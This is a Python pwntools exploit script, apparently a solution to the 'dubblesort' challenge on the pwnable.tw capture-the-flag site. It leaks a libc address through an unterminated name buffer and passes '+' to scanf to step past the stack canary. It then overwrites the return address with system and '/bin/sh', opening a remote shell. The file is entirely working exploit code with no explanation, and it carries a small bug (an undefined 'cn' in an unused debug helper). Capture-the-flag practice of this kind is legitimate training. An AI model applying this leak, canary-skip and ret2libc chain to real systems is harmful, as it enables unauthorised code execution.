#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0
system_offset = 0x3a940
bin_sh_offset = 0x158e8b

if local:
	con = process('./dubblesort', env={'LD_PRELOAD':'./libc_32.so.6'})
	bin = ELF('./dubblesort')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	con = remote('chall.pwnable.tw', 10101)
	bin = ELF('./dubblesort')
	libc = ELF('./libc_32.so.6')


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()


con.recvuntil("What your name :")
con.sendline('A'*24)
rec = u32(con.recvuntil(',')[30:34])
libc_base = rec - 0xa - 0x1b0000
system_addr = libc_base + system_offset
print "system_addr:   ",system_addr
bin_sh_addr = libc_base + bin_sh_offset
print "bin_sh_addr:   ",bin_sh_addr
con.sendline('35')
con.recv(1024)

for i in range(24):
    con.sendline('0')
    con.recv(1024)
con.sendline('+')
con.recv(1024)
for i in range(25,34):
    con.sendline(str(system_addr))
    con.recv(1024)
con.sendline(str(bin_sh_addr))
con.recv()
con.interactive()
con.close()